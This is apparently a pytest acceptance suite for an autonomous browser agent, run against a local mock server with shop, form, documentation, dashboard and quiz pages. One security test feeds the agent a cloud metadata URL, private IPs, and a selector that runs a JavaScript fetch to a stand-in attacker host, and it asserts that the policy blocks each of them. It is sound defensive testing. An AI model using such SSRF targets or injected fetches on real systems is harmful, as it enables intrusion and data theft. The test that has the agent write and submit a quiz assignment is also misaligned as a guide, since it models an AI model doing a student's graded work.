import asyncio
import http.server
import json
import threading
import time
from typing import Any, Dict, List
import pytest

from policy import PolicyViolationError, is_consequential_action, validate_action, validate_url
from schemas.browser_task import BrowserAction, BrowserActionType, BrowserPlan, BrowserPlanStep, BrowserTaskStatus
from perception import extract_page_perception
from actions import UniversalActionExecutor
from discovery import WorkflowDiscoveryEngine
from reasoning import UniversalReasoningEngine
from worker import BrowserWorkerRunner


class UniversalTestMockServer(http.server.SimpleHTTPRequestHandler):
    """Local multi-paradigm test server serving educational, ecommerce, documentation, form, and dashboard pages."""

    def log_message(self, format, *args):
        pass  # Suppress verbose terminal HTTP logging

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        if self.path == "/edu":
            # Test A: Educational Website
            html = """<!DOCTYPE html>
            <html>
            <head><title>Academy: Business Case Analysis</title></head>
            <body>
                <h1>Lesson 1: Turnaround Strategies</h1>
                <p>Read the background: Apex Logistics experienced significant margin recovery following tech overhaul.</p>
                <form id="quiz-form" onsubmit="event.preventDefault(); document.getElementById('result').innerText='COMPLETED - Score: 100%';">
                    <label for="q1">Summarize turnaround key driver:</label>
                    <textarea id="q1" name="q1" placeholder="Write response here..."></textarea>
                    <br/>
                    <label><input type="radio" name="perf" value="high" checked> High Performance</label>
                    <label><input type="radio" name="perf" value="low"> Low Performance</label>
                    <br/>
                    <button type="submit" id="submit-quiz">Submit Assignment</button>
                </form>
                <div id="result">In Progress</div>
            </body>
            </html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/shop":
            # Test B: E-Commerce Website
            html = """<!DOCTYPE html>
            <html>
            <head><title>TechStore: Laptops Catalog</title></head>
            <body>
                <h1>Browse Premium Laptops</h1>
                <div id="cookie-banner" class="modal">
                    <span>We use cookies to improve your experience.</span>
                    <button id="accept-cookies">Accept all</button>
                </div>
                <input type="search" id="search-box" placeholder="Search laptops..." />
                <button id="search-btn" onclick="document.getElementById('catalog').style.display='block';">Search</button>
                <div id="catalog">
                    <div class="product-card" id="item-1">
                        <h3>ThinkBook 14 - ₹54,990</h3>
                        <p>Intel Core i5, 16GB RAM, 512GB SSD</p>
                        <button id="view-1">View Details</button>
                        <button id="buy-1" class="btn-checkout">Buy Now</button>
                    </div>
                    <div class="product-card" id="item-2">
                        <h3>IdeaPad Slim 3 - ₹48,500</h3>
                        <p>AMD Ryzen 5, 16GB RAM, 512GB SSD</p>
                        <button id="view-2">View Details</button>
                        <button id="buy-2" class="btn-checkout">Buy Now</button>
                    </div>
                </div>
            </body>
            </html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/docs":
            # Test C: Documentation Website
            html = """<!DOCTYPE html>
            <html>
            <head><title>Unified AI Developer Documentation</title></head>
            <body>
                <h1>Developer Guides</h1>
                <nav id="sidebar">
                    <a href="#quickstart" id="link-quickstart">Quickstart Guide</a>
                    <a href="#api-ref" id="link-api">API Reference</a>
                    <a href="#specs" id="link-specs">System Specs</a>
                </nav>
                <main id="content">
                    <h2>API Endpoints Comparison</h2>
                    <table id="api-table" border="1">
                        <thead>
                            <tr><th>Endpoint</th><th>Method</th><th>Description</th></tr>
                        </thead>
                        <tbody>
                            <tr><td>/api/v1/chat</td><td>POST</td><td>Streams conversational responses</td></tr>
                            <tr><td>/api/v1/browser</td><td>POST</td><td>Executes autonomous browser tasks</td></tr>
                            <tr><td>/api/v1/wifi</td><td>GET</td><td>Reads ESP32 CSI sensing frames</td></tr>
                        </tbody>
                    </table>
                    <p id="grounded-info">Antigravity engine supports 28 general-purpose browser actions.</p>
                </main>
            </body>
            </html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/form":
            # Test D: Form-Based Website
            html = """<!DOCTYPE html>
            <html>
            <head><title>Candidate Registration Portal</title></head>
            <body>
                <h1>Apply for Software Engineering Fellowship</h1>
                <form id="reg-form" onsubmit="event.preventDefault(); document.getElementById('status').innerText='Application Submitted Successfully';">
                    <label for="full_name">Full Name:</label>
                    <input type="text" id="full_name" name="full_name" placeholder="Enter your full name" />
                    <br/>
                    <label for="email">Email Address:</label>
                    <input type="email" id="email" name="email" placeholder="user@example.com" />
                    <br/>
                    <label for="track">Engineering Track:</label>
                    <select id="track" name="track">
                        <option value="">Select track...</option>
                        <option value="ai_systems">Autonomous AI Systems</option>
                        <option value="dsp_sensing">Wi-Fi CSI & Signal Processing</option>
                    </select>
                    <br/>
                    <label><input type="checkbox" id="tos" name="tos"> I agree to terms and privacy</label>
                    <br/>
                    <button type="submit" id="submit-application">Submit Application</button>
                </form>
                <div id="status">Ready</div>
            </body>
            </html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/dashboard":
            # Test E: Dynamic Dashboard
            html = """<!DOCTYPE html>
            <html>
            <head><title>Executive Telemetry Dashboard</title></head>
            <body>
                <h1>Real-Time Operations</h1>
                <div role="tablist">
                    <button role="tab" id="tab-analytics" onclick="document.getElementById('view-title').innerText='Telemetry Metrics';">Analytics</button>
                    <button role="tab" id="tab-nodes" onclick="document.getElementById('view-title').innerText='Hardware Cluster Nodes';">Nodes</button>
                </div>
                <h2 id="view-title">Telemetry Metrics</h2>
                <table id="metrics-table" border="1">
                    <thead><tr><th>Cluster Node</th><th>Latency</th><th>Status</th></tr></thead>
                    <tbody>
                        <tr><td>del01-prod</td><td>12ms</td><td>Healthy</td></tr>
                        <tr><td>del02-sensing</td><td>18ms</td><td>Healthy</td></tr>
                        <tr><td>del03-ruview</td><td>14ms</td><td>Active ADR-018</td></tr>
                    </tbody>
                </table>
            </body>
            </html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/tab1":
            # Test F: Tab 1
            html = "<html><head><title>Primary Portal Tab</title></head><body><h1>Primary Tab Loaded</h1><a href='/tab2' target='_blank' id='open-second'>Open Second Tab</a></body></html>"
            self.wfile.write(html.encode("utf-8"))

        elif self.path == "/tab2":
            # Test F: Tab 2
            html = "<html><head><title>Secondary Verification Tab</title></head><body><h1>Secondary Tab Data Verified</h1><span id='data-sync'>SYNC_CONFIRMED_2026</span></body></html>"
            self.wfile.write(html.encode("utf-8"))

        else:
            self.wfile.write(b"<html><body><h1>Universal Test Server Active</h1></body></html>")


@pytest.fixture(scope="module")
def universal_mock_server():
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), UniversalTestMockServer)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{port}"
    server.shutdown()
    server.server_close()


# ==============================================================================
# TEST A: EDUCATIONAL WEBSITE ACCEPTANCE
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_a_educational_website(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate to /edu
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/edu"),
            page=page, context=context,
        )
        assert page.url.endswith("/edu")

        # 2. Extract DOM Perception
        perception = await extract_page_perception(page)
        assert len(perception.interactive_elements) >= 3
        assert "Lesson 1: Turnaround Strategies" in perception.headings[0]

        # 3. Locate and fill textarea
        q_elem = next(el for el in perception.interactive_elements if el.tag == "textarea")
        await runner.action_executor.execute(
            action=BrowserAction(
                action_type=BrowserActionType.TYPE_TEXT,
                selector=q_elem.selector,
                text="Turnaround anchored in automated digital logistics.",
            ),
            page=page, context=context,
        )

        # 4. Submit assignment
        submit_btn = next(el for el in perception.interactive_elements if "submit" in el.text.lower())
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CLICK, selector=submit_btn.selector),
            page=page, context=context,
        )

        # 5. Verify completion state on website
        await page.wait_for_timeout(500)
        result_text = await page.text_content("#result")
        assert "COMPLETED - Score: 100%" in result_text


# ==============================================================================
# TEST B: E-COMMERCE WEBSITE ACCEPTANCE & CONSEQUENTIAL HALT
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_b_ecommerce_website(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate to /shop
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/shop"),
            page=page, context=context,
        )

        # 2. Detect & dismiss cookie overlay via WorkflowDiscoveryEngine
        perception = await extract_page_perception(page)
        dismiss_el = runner.reasoning_engine.discovery.detect_blocking_modal_or_overlay(perception)
        assert dismiss_el is not None
        assert "accept" in dismiss_el.text.lower()
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CLICK, selector=dismiss_el.selector),
            page=page, context=context,
        )

        # 3. Discover and use search input
        perception_after = await extract_page_perception(page)
        search_input = runner.reasoning_engine.discovery.find_search_input(perception_after)
        assert search_input is not None
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.TYPE_TEXT, selector=search_input.selector, text="laptop under 60000"),
            page=page, context=context,
        )
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CLICK, selector="#search-btn"),
            page=page, context=context,
        )

        # 4. Compare products
        item1_text = await page.text_content("#item-1")
        item2_text = await page.text_content("#item-2")
        assert "ThinkBook 14 - ₹54,990" in item1_text
        assert "IdeaPad Slim 3 - ₹48,500" in item2_text

        # 5. Consequential action policy gate: Attempting checkout must trigger confirmation
        buy_action = BrowserAction(action_type=BrowserActionType.CLICK, selector="#buy-1")
        is_conseq, reason = is_consequential_action(buy_action, task_goal="Find laptops and buy one")
        assert is_conseq is True
        assert "Financial transaction or purchase" in reason


# ==============================================================================
# TEST C: DOCUMENTATION WEBSITE ACCEPTANCE & STRUCTURED EXTRACTION
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_c_documentation_website(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate to /docs
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/docs"),
            page=page, context=context,
        )

        # 2. Extract perception including structured tables
        perception = await extract_page_perception(page)
        assert len(perception.tables) >= 1
        tbl = perception.tables[0]
        assert "Endpoint" in tbl["headers"]
        assert "Method" in tbl["headers"]

        # 3. Extract table via UniversalActionExecutor
        outcome = await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.EXTRACT_TABLE, selector="#api-table"),
            page=page, context=context,
        )
        assert "table_data" in outcome
        rows = outcome["table_data"]["rows"]
        assert len(rows) >= 3
        endpoints = [r[0] for r in rows]
        assert "/api/v1/browser" in endpoints
        assert "/api/v1/wifi" in endpoints

        # 4. Grounded content verification
        grounded_text = await page.text_content("#grounded-info")
        assert "Antigravity engine supports 28 general-purpose browser actions" in grounded_text


# ==============================================================================
# TEST D: FORM-BASED WEBSITE ACCEPTANCE & VALIDATION
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_d_form_website(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate to /form
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/form"),
            page=page, context=context,
        )

        # 2. Form field matching via WorkflowDiscoveryEngine
        perception = await extract_page_perception(page)
        candidate_data = {
            "full_name": "Shivam Patil",
            "email": "shivam@example.com",
        }
        field_matches = runner.reasoning_engine.discovery.match_form_inputs(perception, candidate_data)
        assert len(field_matches) == 2

        # 3. Fill text inputs
        for el, val in field_matches:
            await runner.action_executor.execute(
                action=BrowserAction(action_type=BrowserActionType.TYPE_TEXT, selector=el.selector, text=val),
                page=page, context=context,
            )

        # 4. Select dropdown option
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.SELECT_OPTION, selector="#track", value="ai_systems"),
            page=page, context=context,
        )

        # 5. Check agreement checkbox
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CHECK_BOX, selector="#tos"),
            page=page, context=context,
        )
        assert await page.is_checked("#tos") is True

        # 6. Consequential submission check
        submit_action = BrowserAction(action_type=BrowserActionType.CLICK, selector="#submit-application")
        validate_action(submit_action, allow_local=True)
        await runner.action_executor.execute(action=submit_action, page=page, context=context)

        status_text = await page.text_content("#status")
        assert "Application Submitted Successfully" in status_text


# ==============================================================================
# TEST E: DYNAMIC DASHBOARD ACCEPTANCE & TAB NAVIGATION
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_e_dynamic_dashboard(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate to /dashboard
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/dashboard"),
            page=page, context=context,
        )

        # 2. Switch tab on dashboard
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CLICK, selector="#tab-nodes"),
            page=page, context=context,
        )
        title = await page.text_content("#view-title")
        assert "Hardware Cluster Nodes" in title

        # 3. Extract dynamic table
        outcome = await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.EXTRACT_TABLE, selector="#metrics-table"),
            page=page, context=context,
        )
        rows = outcome["table_data"]["rows"]
        assert any("del03-ruview" in r[0] for r in rows)


# ==============================================================================
# TEST F: MULTI-TAB WORKFLOW ACCEPTANCE
# ==============================================================================

@pytest.mark.asyncio
async def test_acceptance_f_multitab_workflow(universal_mock_server):
    runner = BrowserWorkerRunner(headless=True, allow_local=True)
    async with runner.session_manager.create_session() as (browser, context, page):
        # 1. Navigate page 1 to /tab1
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NAVIGATE, url=f"{universal_mock_server}/tab1"),
            page=page, context=context,
        )
        assert len(context.pages) == 1

        # 2. Open new tab to /tab2
        outcome_new = await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.NEW_TAB, url=f"{universal_mock_server}/tab2"),
            page=page, context=context,
        )
        assert len(context.pages) == 2
        tab2 = context.pages[1]
        assert tab2.url.endswith("/tab2")

        # 3. Verify data in tab 2
        sync_val = await tab2.text_content("#data-sync")
        assert sync_val == "SYNC_CONFIRMED_2026"

        # 4. Switch back to tab 0
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.SWITCH_TAB, tab_index=0),
            page=page, context=context,
        )
        assert context.pages[0].url.endswith("/tab1")

        # 5. Close tab 1
        await runner.action_executor.execute(
            action=BrowserAction(action_type=BrowserActionType.CLOSE_TAB, tab_index=1),
            page=page, context=context,
        )
        assert len(context.pages) == 1


# ==============================================================================
# TEST G: SECURITY, SSRF DEFENSE & PROMPT DEFENSE
# ==============================================================================

def test_security_ssrf_egress_and_prompt_injection():
    # 1. Block private IP / loopback when allow_local=False
    with pytest.raises(PolicyViolationError):
        validate_url("http://169.254.169.254/computeMetadata/v1/", allow_local=False)

    with pytest.raises(PolicyViolationError):
        validate_url("http://192.168.1.100/admin", allow_local=False)

    with pytest.raises(PolicyViolationError):
        validate_url("http://10.0.0.1/", allow_local=False)

    # 2. Dangerous script in selector
    with pytest.raises(PolicyViolationError):
        validate_action({"action_type": "click", "selector": "javascript:fetch('http://attacker.com')"})

    # 3. Consequential action detection
    conseq, reason = is_consequential_action({"action_type": "click", "selector": "#delete-account-btn"})
    assert conseq is True
    assert "Destructive deletion operation" in reason

    conseq_pay, reason_pay = is_consequential_action({"action_type": "click", "selector": "#confirm-payment"})
    assert conseq_pay is True
    assert "Financial transaction" in reason_pay
